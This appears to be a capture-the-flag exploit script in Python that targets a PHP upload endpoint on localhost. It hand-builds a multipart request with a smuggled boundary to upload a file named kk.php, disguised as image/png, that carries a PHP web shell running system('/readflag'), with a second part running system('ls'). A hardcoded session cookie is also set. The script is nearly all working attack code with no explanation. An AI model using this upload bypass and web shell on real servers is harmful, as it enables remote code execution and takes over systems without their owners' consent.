import requests 
url = "http://localhost:8000"

s = requests.session() 
s.cookies.set("PHPSESSID", "kppojvn3m1sk8jqm82ovisl31s",domain="localhost:8000")

smugg = """\r\n------WebKitFormBoundaryYPC8lXjLqHBaja1w\r\nContent-Disposition: form-data; name="file"; filename="asdf.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?= system('ls') ?>\r\n"""

data = "<?= system('/readflag'); ?>"
boundary = "----WebKitFormBoundaryjBfoTp8LrPrhjeOh\r\n"
# boundary = "eb49546974d8f6390d509c92cf1363cf15ab542feab93fc2a0c7db525470"
post_data = f"--{boundary}\r\n"
post_data += "Content-Disposition: form-data; name=\"file\"; filename=\"kk.php\"\r\n"
post_data += "Content-Type: image/png\r\n"
post_data += f"\r\n{data}\r\n"
post_data += f"--{boundary}\r\n"

# while True:
for _ in range(1):
    r = s.post(
        f"{url}",
        # headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjBfoTp8LrPrhjeOh",
                #  "Content-Length": f"{len(boundary) + len(post_data)}"},
        files={
            "file" : ("", f"{post_data}", "text/html"),
            # "file" : ("asdf.php2", "<?= system('/readflag'); ?>", "application/x-httpd-php")
        }
    )
    print(r.text)